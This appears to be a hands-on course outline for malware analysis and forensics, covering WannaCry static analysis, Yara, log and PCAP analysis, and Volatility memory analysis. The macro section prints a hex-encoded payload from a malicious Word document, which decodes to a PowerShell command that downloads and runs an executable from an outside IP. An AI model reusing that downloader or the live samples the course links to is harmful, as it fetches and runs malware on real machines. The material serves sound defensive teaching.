@@ -1,0 +1,1184 @@
+############################
+# Download the Analysis VM #
+############################
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Ubuntu-17-10-InfoSecAddictsVM.zip
+user: infosecaddicts
+pass: infosecaddicts
+
+
+
+
+
+###################################
+# Day 1: Intro to Static Analysis #
+###################################
+
+- Log in to your Ubuntu system with the username 'infosecaddicts' and the password 'infosecaddicts'.
+
+ 
+- After logging please open a terminal window and type the following commands:
+---------------------------Type This----------------------------------- 
+sudo apt-get install -y python-pefile vim
+     infosecaddicts
+
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/wannacry.zip --no-check-certificate
+wget https://s3.amazonaws.com/infosecaddictsfiles/analyse_malware.py --no-check-certificate
+ 
+unzip wannacry.zip
+     infected
+ 
+file wannacry.exe
+ 
+mv wannacry.exe malware.pdf
+ 
+file malware.pdf
+ 
+mv malware.pdf wannacry.exe
+ 
+hexdump -n 2 -C wannacry.exe
+----------------------------------------------------------------------- 
+ 
+ 
+ 
+***What is '4d 5a' or 'MZ'***
+Reference:
+http://www.garykessler.net/library/file_sigs.html
+ 
+ 
+ 
+ 
+---------------------------Type This----------------------------------- 
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings --all wannacry.exe | head -n 6
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+----------------------------------------------------------------------- 
+ 
+
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+Ok, let's look for the individual strings
+ 
+ 
+---------------------------Type This----------------------------------- 
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+####################################
+# Tired of GREP - let's try Python #
+####################################
+Decided to make my own script for this kind of stuff in the future. I
+ 
+Reference1:
+https://s3.amazonaws.com/infosecaddictsfiles/analyse_malware.py
+ 
+This is a really good script for the basics of static analysis
+ 
+Reference:
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+This is really good for showing some good signatures to add to the Python script
+ 
+ 
+Here is my own script using the signatures (started this yesterday, but still needs work):
+https://pastebin.com/guxzCBmP
+ 
+ 
+ 
+---------------------------Type This----------------------------------- 
+wget https://pastebin.com/raw/guxzCBmP
+ 
+ 
+mv guxzCBmP am.py
+ 
+ 
+nano am.py
+ 
+python am.py wannacry.exe
+-----------------------------------------------------------------------
+
+
+################################
+# Good references for WannaCry #
+################################
+ 
+References:
+ 
+https://gist.github.com/rain-1/989428fa5504f378b993ee6efbc0b168
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+
+
+
+
+
+
+Building a Malware Scanner
+--------------------------
+
+---------------------------Type This-----------------------------------
+mkdir ~/Desktop/malwarescanner
+
+cd ~/Desktop/malwarescanner
+
+wget https://github.com/jonahbaron/malwarescanner/archive/master.zip
+
+unzip master.zip
+
+cd malwarescanner-master/
+
+python scanner.py -h
+
+cat strings.txt
+
+cat hashes.txt
+
+mkdir ~/Desktop/malcode
+
+cp ~/Desktop/malware.exe ~/Desktop/malcode
+
+python scanner.py -H hashes.txt -D ~/Desktop/malcode/ strings.txt
+
+cd ~/Desktop/
+-----------------------------------------------------------------------
+
+
+#####################################################
+# Analyzing Macro Embedded Malware                  #
+# Reference:                                        #
+# https://jon.glass/analyzes-dridex-malware-p1/     #
+#####################################################
+---------------------------Type This-----------------------------------
+cd ~/Desktop/
+
+
+sudo pip install olefile
+     
+
+mkdir ~/Desktop/oledump
+
+cd ~/Desktop/oledump
+
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/064016.zip
+
+unzip 064016.zip
+     infected
+
+python oledump.py 064016.doc
+
+python oledump.py 064016.doc -s A4 -v
+-----------------------------------------------------------------------
+
+
+
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams. 
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’. 
+
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A5 -v
+-----------------------------------------------------------------------
+
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A3 -v
+----------------------------------------------------------------------- 
+
+
+- Look for "GVhkjbjv" and you should see: 
+
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+
+
+
+
+##############
+# Yara Ninja #
+##############
+---------------------------Type This-----------------------------------
+sudo apt-get remove -y yara
+
+
+wget https://github.com/plusvic/yara/archive/v3.4.0.zip
+
+sudo apt-get -y install libtool
+
+
+unzip v3.4.0.zip
+
+cd yara-3.4.0
+
+./bootstrap.sh
+
+./configure
+
+make
+
+sudo make install
+
+
+yara -v
+
+cd ..
+
+wget https://github.com/Yara-Rules/rules/archive/master.zip
+
+unzip master.zip
+
+cd ~/Desktop
+
+yara rules-master/packer.yar malcode/malware.exe
+-----------------------------------------------------------------------
+
+
+
+Places to get more Yara rules:
+------------------------------
+https://malwareconfig.com/static/yaraRules/
+https://github.com/kevthehermit/YaraRules
+https://github.com/VectraThreatLab/reyara
+
+
+
+Yara rule sorting script:
+-------------------------
+https://github.com/mkayoh/yarasorter
+
+
+---------------------------Type This-----------------------------------
+cd ~/Desktop/rules-master
+for i in $( ls *.yar --hide=master.yar ); do echo include \"$i\";done > master.yar
+cd ~/Desktop/
+yara rules-master/master.yar malcode/malware.exe
+-----------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+Here is a 2 million sample malware DB created by Derek Morton that you can use to start your DB with:
+http://derekmorton.name/files/malware_12-14-12.sql.bz2
+
+
+Malware Repositories:
+---------------------
+http://malshare.com/index.php
+http://www.malwareblacklist.com/
+http://www.virusign.com/
+http://virusshare.com/
+http://www.tekdefense.com/downloads/malware-samples/
+
+
+
+
+
+
+
+
+
+
+
+###############################
+# Creating a Malware Database #
+###############################
+
+Creating a malware database (sqlite)
+---------------------------Type This-----------------------------------
+sudo apt-get install -y python-simplejson python-simplejson-dbg
+
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/avsubmit.py
+wget https://s3.amazonaws.com/infosecaddictsfiles/malware-password-is-infected.zip
+
+unzip malware-password-is-infected.zip
+	infected
+
+python avsubmit.py --init
+
+python avsubmit.py -f malware.exe -e
+-----------------------------------------------------------------------
+
+
+
+
+Creating a malware database (mysql)
+-----------------------------------
+- Step 1: Installing MySQL database
+- Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+sudo apt-get install mysql-server
+-----------------------------------------------------------------------
+	 
+- Step 2: Installing Python MySQLdb module
+- Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+sudo apt-get build-dep python-mysqldb
+
+
+sudo apt-get install python-mysqldb
+
+-----------------------------------------------------------------------
+
+Step 3: Logging in 
+Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+mysql -u root -p					(set a password of 'malware')
+-----------------------------------------------------------------------
+
+
+- Then create one database by running following command:
+---------------------------Type This-----------------------------------
+create database malware;
+
+exit;
+
+wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py
+
+vi mal_to_db.py						(fill in database connection information)
+
+python mal_to_db.py -i
+-----------------------------------------------------------------------
+
+------- check it to see if the files table was created ------
+
+---------------------------Type This-----------------------------------
+mysql -u root -p
+	malware
+
+show databases;
+
+use malware;
+
+show tables;
+
+describe files;
+
+exit;
+-----------------------------------------------------------------------
+
+
+- Now add the malicious file to the DB
+---------------------------Type This-----------------------------------
+python mal_to_db.py -f malware.exe -u
+-----------------------------------------------------------------------
+
+
+- Now check to see if it is in the DB
+---------------------------Type This-----------------------------------
+mysql -u root -p
+	malware
+
+mysql> use malware;
+
+select id,md5,sha1,sha256,time FROM files;
+
+mysql> quit;
+------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+################################
+# Day 2: Log and PCAP Analysis #
+################################
+
+
+
+
+##############################################
+# Log Analysis with Linux command-line tools #
+##############################################
+The following command line executables are found in the Mac as well as most Linux Distributions.
+ 
+cat –  prints the content of a file in the terminal window
+grep – searches and filters based on patterns
+awk –  can sort each row into fields and display only what is needed
+sed –  performs find and replace functions
+sort – arranges output in an order
+uniq – compares adjacent lines and can report, filter or provide a count of duplicates
+ 
+ 
+ 
+ 
+##############
+# Cisco Logs #
+##############
+---------------------------Type This----------------------------------- 
+wget https://s3.amazonaws.com/infosecaddictsfiles/cisco.log
+----------------------------------------------------------------------- 
+ 
+AWK Basics
+----------
+To quickly demonstrate the print feature in awk, we can instruct it to show only the 5th word of each line. Here we will print $5. Only the last 4 lines are being shown for brevity.
+---------------------------Type This-----------------------------------
+cat cisco.log | awk '{print $5}' | tail -n 4
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Looking at a large file would still produce a large amount of output. A more useful thing to do might be to output every entry found in “$5”, group them together, count them, then sort them from the greatest to least number of occurrences. This can be done by piping the output through “sort“, using “uniq -c” to count the like entries, then using “sort -rn” to sort it in reverse order.
+---------------------------Type This-----------------------------------
+cat cisco.log | awk '{print $5}'| sort | uniq -c | sort -rn
+-----------------------------------------------------------------------
+ 
+ 
+ 
+While that’s sort of cool, it is obvious that we have some garbage in our output. Evidently we have a few lines that aren’t conforming to the output we expect to see in $5. We can insert grep to filter the file prior to feeding it to awk. This insures that we are at least looking at lines of text that contain “facility-level-mnemonic”.
+---------------------------Type This-----------------------------------
+cat cisco.log | grep %[a-zA-Z]*-[0-9]-[a-zA-Z]* | awk '{print $5}' | sort | uniq -c | sort -rn
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+Now that the output is cleaned up a bit, it is a good time to investigate some of the entries that appear most often. One way to see all occurrences is to use grep.
+---------------------------Type This-----------------------------------
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| awk '{print $10}' | sort | uniq -c | sort -rn
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10}' | sort | uniq -c | sort -rn
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10 " changed to " $14}' | sort | uniq -c | sort -rn
+-----------------------------------------------------------------------
+ 
+ 
+
+
+
+###############
+# Apache Logs #
+###############
+---------------------------Type This-----------------------------------
+wget https://s3.amazonaws.com/infosecaddictsfiles/access_log
+-----------------------------------------------------------------------
+ 
+# top 20 URLs from the last 5000 hits
+---------------------------Type This-----------------------------------
+tail -5000 ./access_log | awk '{print $7}' | sort | uniq -c | sort -rn | head -20
+tail -5000 ./access_log | awk '{freq[$7]++} END {for (x in freq) {print freq[x], x}}' | sort -rn | head -20
+-----------------------------------------------------------------------
+
+ 
+# top 20 URLS excluding POST data from the last 5000 hits
+---------------------------Type This-----------------------------------
+tail -5000 ./access_log | awk -F"[ ?]" '{print $7}' | sort | uniq -c | sort -rn | head -20
+tail -5000 ./access_log | awk -F"[ ?]" '{freq[$7]++} END {for (x in freq) {print freq[x], x}}' | sort -rn | head -20
+-----------------------------------------------------------------------
+
+ 
+# top 20 IPs from the last 5000 hits
+---------------------------Type This-----------------------------------
+tail -5000 ./access_log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
+tail -5000 ./access_log | awk '{freq[$1]++} END {for (x in freq) {print freq[x], x}}' | sort -rn | head -20
+-----------------------------------------------------------------------
+
+
+ 
+# top 20 URLs requested from a certain ip from the last 5000 hits
+---------------------------Type This-----------------------------------
+IP=141.101.80.187; tail -5000 ./access_log | grep $IP | awk '{print $7}' | sort | uniq -c | sort -rn | head -20
+IP=141.101.80.187; tail -5000 ./access_log | awk -v ip=$IP ' $1 ~ ip {freq[$7]++} END {for (x in freq) {print freq[x], x}}' | sort -rn | head -20
+-----------------------------------------------------------------------
+
+
+ 
+# top 20 URLS requested from a certain ip excluding, excluding POST data, from the last 5000 hits
+---------------------------Type This-----------------------------------
+IP=141.101.80.187; tail -5000 ./access_log | fgrep $IP | awk -F "[ ?]" '{print $7}' | sort | uniq -c | sort -rn | head -20
+IP=141.101.80.187; tail -5000 ./access_log | awk -F"[ ?]" -v ip=$IP ' $1 ~ ip {freq[$7]++} END {for (x in freq) {print freq[x], x}}' | sort -rn | head -20
+-----------------------------------------------------------------------
+
+
+ 
+# top 20 referrers from the last 5000 hits
+---------------------------Type This-----------------------------------
+tail -5000 ./access_log | awk '{print $11}' | tr -d '"' | sort | uniq -c | sort -rn | head -20
+tail -5000 ./access_log | awk '{freq[$11]++} END {for (x in freq) {print freq[x], x}}' | tr -d '"' | sort -rn | head -20
+-----------------------------------------------------------------------
+
+
+ 
+# top 20 user agents from the last 5000 hits
+---------------------------Type This-----------------------------------
+tail -5000 ./access_log | cut -d\  -f12- | sort | uniq -c | sort -rn | head -20
+-----------------------------------------------------------------------
+
+
+ 
+# sum of data (in MB) transferred in the last 5000 hits
+---------------------------Type This-----------------------------------
+tail -5000 ./access_log | awk '{sum+=$10} END {print sum/1048576}'
+-----------------------------------------------------------------------
+
+
+
+
+
+ 
+#################################
+# Using Python for log analysis #
+#################################
+---------------------------Type This-----------------------------------
+wget https://s3.amazonaws.com/infosecaddictsfiles/access_log
+ 
+ 
+cat access_log | grep 141.101.80.188
+ 
+cat access_log | grep 141.101.80.187
+ 
+cat access_log | grep 108.162.216.204
+ 
+cat access_log | grep 173.245.53.160
+
+cat access_log | grep 173.245.53.160 | wc -l
+ 
+---------------------------------------------------------
+ 
+ 
+Take a look at the following reference:
+http://cmdlinetips.com/2011/08/three-ways-to-read-a-text-file-line-by-line-in-python/
+ 
+ 
+
+Let's have some fun.....
+---------------------------Type This-----------------------------------
+python 
+
+>>> f = open('access_log', "r")
+ 
+>>> lines = f.readlines()
+ 
+>>> print lines
+ 
+>>> lines[0]
+ 
+>>> lines[10]
+ 
+>>> lines[50]
+ 
+>>> lines[1000]
+ 
+>>> lines[5000]
+ 
+>>> lines[10000]
+ 
+>>> print len(lines)
+
+>>> exit()
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+nano logread1.py
+ 
+
+
+----------------------Paste this in the file----------------------------
+## Open the file with read only permit
+f = open('access_log', "r")
+ 
+## use readlines to read all lines in the file
+## The variable "lines" is a list containing all lines
+lines = f.readlines()
+ 
+print lines
+ 
+ 
+## close the file after reading the lines.
+f.close()
+ 
+-----------------------------------------------------------------------
+ 
+ 
+Google the following:
+        - python difference between readlines and readline
+        - python readlines and readline
+ 
+ 
+
+ 
+Can you write an if/then statement that looks for the following IP in the log file?
+141.101.81.187
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 1: Use Python to look for a value in a list
+ 
+Reference:
+http://www.wellho.net/mouth/1789_Looking-for-a-value-in-a-list-Python.html
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 2: Use Python to prompt for user input
+ 
+Reference:
+http://www.cyberciti.biz/faq/python-raw_input-examples/
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 3: Use Python to search for a string in a list
+ 
+Reference:
+http://stackoverflow.com/questions/4843158/check-if-a-python-list-item-contains-a-string-inside-another-string
+ 
+ 
+ 
+ 
+ 
+Here is my solution:
+-------------------
+$ python
+>>> f = open('access_log', "r")
+>>> lines = f.readlines()
+>>> ip = '141.101.81.187'
+>>> for string in lines:
+...     if ip in string:
+...             print(string)
+
+>>>
+>>> exit()
+
+ 
+ 
+ 
+ 
+Here is one student's solution - can you please explain each line of this code to me?
+-------------------------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+nano logread1.py
+ 
+ 
+ 
+----------------------Paste this in the file----------------------------
+#!/usr/bin/python
+ 
+f = open('access_log')
+ 
+strUsrinput = raw_input("Enter IP Address: ")
+ 
+for line in iter(f):
+    ip = line.split(" - ")[0]
+    if ip == strUsrinput:
+        print line
+ 
+f.close()
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+-------------------------------
+ 
+Working with another student after class we came up with another solution:
+
+---------------------------Type This-----------------------------------
+nano logread1.py
+ 
+ 
+ 
+----------------------Paste this in the file---------------------------- 
+#!/usr/bin/env python
+ 
+ 
+# This line opens the log file
+f=open('access_log',"r")
+ 
+# This line takes each line in the log file and stores it as an element in the list
+lines = f.readlines()
+ 
+ 
+# This lines stores the IP that the user types as a var called userinput
+userinput = raw_input("Enter the IP you want to search for: ")
+ 
+ 
+ 
+# This combination for loop and nested if statement looks for the IP in the list called lines and prints the entire line if found.
+for ip in lines:
+    if ip.find(userinput) != -1:
+        print ip
+------------------------------------------------------------------------ 
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+#################
+# PCAP Analysis #
+#################
+---------------------------Type This-----------------------------------
+cd ~/Desktop/
+
+mkdir suspiciouspcap/
+
+cd suspiciouspcap/
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/suspicious-time.pcap
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/chaosreader.pl
+
+
+perl chaosreader.pl suspicious-time.pcap
+
+python -m SimpleHTTPServer
+------------------------------------------------------------------------
+Now you can just browse to the IP address of your Linux box on port 8000
+
+http://Linux-Box-IP:8000/
+
+
+
+--------------------------Type This-----------------------------------
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
+
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
+
+
+for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
+------------------------------------------------------------------------
+
+
+
+
+########################
+# Playing with TCPDump #
+########################
+
+Let's install tcpdump
+---------------------------Type This-----------------------------------
+sudo apt install -y tcpdump
+------------------------------------------------------------------------
+
+
+
+The easiest way to use tcpdump is to just directly write a pcap file
+Run tcpdump to capture a .pcap file that we will use for the next exercise
+ 
+---------------------------Type This-----------------------------------
+ 
+sudo tcpdump -ni eth0 -s0 -w quick.pcap
+ 
+----------------------------------------------------------------------
+ 
+--open another command prompt--
+ 
+---------------------------Type This-----------------------------------
+ 
+ 
+wget http://packetlife.net/media/library/12/tcpdump.pdf
+ 
+----------------------------------------------------------------------
+
+
+
+The basic structure of tcpdump output is:
+
+[timestamp] [network protocol] [source IP].[source port] > [destination IP].[destination port]
+
+
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap | head
+------------------------------------------------------------------------
+
+
+
+To grab a count of the number of packets in a capture you can type:
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap | wc -l
+------------------------------------------------------------------------
+
+
+
+To select only the source IP with the port, which is the 3rd column you can type:
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap | cut -f 3 -d " " | head
+------------------------------------------------------------------------
+
+
+
+To filter for just TCP/IP traffic and exclude layer 2 traffic you can use 'tcp or udp'
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap 'tcp or udp' | cut -f 3 -d " " | head
+------------------------------------------------------------------------
+
+
+
+Here we are removing the source port by adding another cut that selects the first 4 columns separated by the "." character:
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap 'tcp or udp' | cut -f 3 -d " " | cut -f 1-4 -d "." | head
+------------------------------------------------------------------------
+
+
+
+Adding sort and uniq cleans up the data a lot more
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap 'tcp or udp' | cut -f 3 -d " " | cut -f 1-4 -d "." | sort | uniq | head
+------------------------------------------------------------------------
+
+
+
+If you wanted to see the destination instead of the sources you can change the first cut statement:
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap 'tcp or udp' | cut -f 5 -d " " | cut -f 1-4 -d "." | sort | uniq | head
+------------------------------------------------------------------------
+
+
+
+Here we can count just how many of these instances occurred
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap 'tcp or udp' | cut -f 5 -d " " | cut -f 1-4 -d "." | sort | uniq -c | sort -nr | head
+------------------------------------------------------------------------
+
+
+
+To examine destination ports, start by selecting only destination IPs and ports for new TCP sessions using a Tcpdump filter of 'tcp[13]=2' which selects only packets 
+with the SYN flag set. That way you don’t accidentally give undue weight to  commonly used ports like 443 and 80, where there may be a large number of  packets over very few sessions as in the case of a HTTP or HTTPS download:
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap 'tcp[13]=2' | cut -f 5 -d " " | sort | uniq -c | sort -nr | head
+------------------------------------------------------------------------
+
+
+
+Now that you've got the top destinations you can use cut to select only the port
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap 'tcp[13]=2' | cut -f 5 -d " " | cut -f 5 -d "." | sort | uniq -c | sort -nr | head
+------------------------------------------------------------------------
+
+
+
+We can do the same with the source IP to see who the top talkers are:
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap 'tcp[13]=2' | cut -f 3 -d " " | cut -f 1-4 -d "." | sort | uniq -c | sort -nr | head
+------------------------------------------------------------------------
+
+
+
+Many network protocols store their data as plain text in the payload portion of a packet (SMTP, Syslog, POP3, FTP ASCII mode, HTTP, DNS, etc), and Tcpdump candisplay this text by using the WA switch:
+---------------------------Type This-----------------------------------
+tcpdump -Ann -r  suspicious-time.pcap 'dst port 25 or dst port 514 or dst port 110 or dst port 21 or dst port 53 or dst port 80' | head -15
+------------------------------------------------------------------------
+
+
+
+Looking at DNS traffic
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap 'port 53' | head -5
+------------------------------------------------------------------------
+
+
+
+Let's try to exclude some of the common TLDs and see what we come up with: 
+---------------------------Type This----------------------------------- 
+tcpdump -nn -r  suspicious-time.pcap 'port 53' | grep -Ev '(com|net|org|gov|mil|arpa)'
+------------------------------------------------------------------------
+
+
+
+Let's grab names instead of IP addresses:
+---------------------------Type This-----------------------------------
+tcpdump -nn -r  suspicious-time.pcap 'port 53' | grep -Ev '(com|net|org|gov|mil|arpa)' | cut -f 8 -d " " | grep -E '[a-z]'
+------------------------------------------------------------------------
+
+
+
+
+Looking at HTTP traffic
+---------------------------Type This-----------------------------------
+tcpdump -Ann -r  suspicious-time.pcap 'dst port 80' | head -15
+------------------------------------------------------------------------
+
+
+
+Removing GET/HEAD methods
+---------------------------Type This-----------------------------------
+tcpdump -Ann -r  suspicious-time.pcap 'dst port 80' | grep 'HTTP' | grep -Ev '(GET|HEAD)' | head
+------------------------------------------------------------------------
+
+
+
+Checking out the referer field
+---------------------------Type This-----------------------------------
+tcpdump -Ann -r  suspicious-time.pcap 'dst port 80' | grep -i 'referer' | head
+------------------------------------------------------------------------
+
+
+
+Checking out the user-agent field
+---------------------------Type This-----------------------------------
+tcpdump -Ann -r  suspicious-time.pcap 'dst port 80' | grep -Ei 'user-agent' | sort | uniq -c | sort -nr | head -15
+------------------------------------------------------------------------
+
+
+
+#############################
+# PCAP Analysis with tshark #
+#############################
+---------------------------Type This-----------------------------------
+sudo tshark -i eth0 -r suspicious-time.pcap -qz io,phs
+ 
+
+tshark -r suspicious-time.pcap | grep 'NB.*20\>' | sed -e 's/<[^>]*>//g' | awk '{print $3,$4,$9}' | sort -u
+
+
+tshark -r suspicious-time.pcap | grep 'NB.*1e\>' | sed -e 's/<[^>]*>//g' | awk '{print $3,$4,$9}' | sort -u
+
+
+tshark -r suspicious-time.pcap arp | grep has | awk '{print $3," -> ",$9}' | tr -d '?'
+
+
+tshark -r suspicious-time.pcap -Tfields -e "eth.src" | sort | uniq
+
+
+tshark -r suspicious-time.pcap -R "browser.command==1" -Tfields -e "ip.src" -e "browser.server" | uniq
+
+tshark -r suspicious-time.pcap -Tfields -e "eth.src" | sort |uniq
+
+tshark -r suspicious-time.pcap -qz ip_hosts,tree
+
+tshark -r suspicious-time.pcap -R "http.request" -Tfields -e "ip.src" -e "http.user_agent" | uniq
+
+tshark -r suspicious-time.pcap -R "dns" -T fields -e "ip.src" -e "dns.flags.response" -e "dns.qry.name"
+
+
+whois rapidshare.com.eyu32.ru
+
+whois sploitme.com.cn
+
+
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' 
+
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico' -e google -e 'honeynet.org'
+
+tshark -r suspicious-time.pcap -qz http_req,tree
+
+tshark -r suspicious-time.pcap -R "data-text-lines contains \"<script\"" -T fields -e frame.number -e ip.src -e ip.dst
+
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico'  | grep 10.0.3.15 | sed -e 's/\?[^cse].*/\?\.\.\./g'
+-----------------------------------------------------------------------
+
+
+######################################
+# PCAP Analysis with forensicPCAP.py #
+######################################
+---------------------------Type This-----------------------------------
+cd ~/Desktop/suspiciouspcap/
+
+wget https://raw.githubusercontent.com/madpowah/ForensicPCAP/master/forensicPCAP.py
+
+sudo pip install cmd2==0.7.9
+
+
+python forensicPCAP.py suspicious-time.pcap
+------------------------------------------------------------------------
+
+
+---------------------------Type This-----------------------------------
+ForPCAP >>> help
+------------------------------------------------------------------------
+
+Prints stats about PCAP
+---------------------------Type This-----------------------------------
+ForPCAP >>> stat
+------------------------------------------------------------------------
+
+Prints all DNS requests from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+---------------------------Type This-----------------------------------
+ForPCAP >>> dns
+
+ForPCAP >>> show
+------------------------------------------------------------------------
+
+Prints all destination ports from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+---------------------------Type This-----------------------------------
+ForPCAP >>> dstports
+
+ForPCAP >>> show
+---------------------------Type This-----------------------------------
+
+Prints the number of ip source and store them.
+---------------------------Type This-----------------------------------
+ForPCAP >>> ipsrc
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+
+Prints the number of web's requests and store them
+ForPCAP >>> web
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+
+
+Prints the number of mail's requests and store them
+---------------------------Type This-----------------------------------
+ForPCAP >>> mail
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+
+
+If you really want to look at some more in-depth analysis of this suspicious-time.pcap file you can download the following document:
+https://s3.amazonaws.com/infosecaddictsfiles/Forensic+Challenge+2010_-_Challenge_2_-_Solution.doc
+
+
+
+
+
+
+
+
+###################################
+# Day 3: Intro to Memory Analysis #
+###################################
+
+---------------------------Type This-----------------------------------
+cd  ~/Desktop/
+
+sudo apt-get install -y foremost tcpxtract
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/hn_forensics.vmem
+
+git clone https://github.com/volatilityfoundation/volatility.git
+
+cd volatility
+sudo pip install distorm3
+sudo python setup.py install
+python vol.py -h
+python vol.py pslist -f ~/Desktop/hn_forensics.vmem
+python vol.py connscan -f ~/Desktop/hn_forensics.vmem
+mkdir dump/
+mkdir -p output/pdf/
+python vol.py -f ~/Desktop/hn_forensics.vmem memdmp -p 888 -D dump/
+python vol.py -f ~/Desktop/hn_forensics.vmem memdmp -p 1752 -D dump/ 
+				***Takes a few min***
+strings 1752.dmp | grep "^http://" | sort | uniq
+strings 1752.dmp | grep "Ahttps://" | uniq -u
+cd ..
